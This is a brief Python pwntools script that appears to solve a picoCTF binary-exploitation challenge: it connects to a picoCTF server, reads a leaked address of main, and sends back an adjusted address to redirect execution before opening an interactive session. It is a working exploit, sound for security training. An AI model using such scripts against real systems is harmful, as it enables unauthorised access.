from pwn import *
p=process("./vuln")
p=remote('rescued-float.picoctf.net' ,64503)
print(p.recvuntil("main: "))

p.sendline(hex(int(p.recvline().decode(),16)-150))
p.interactive()

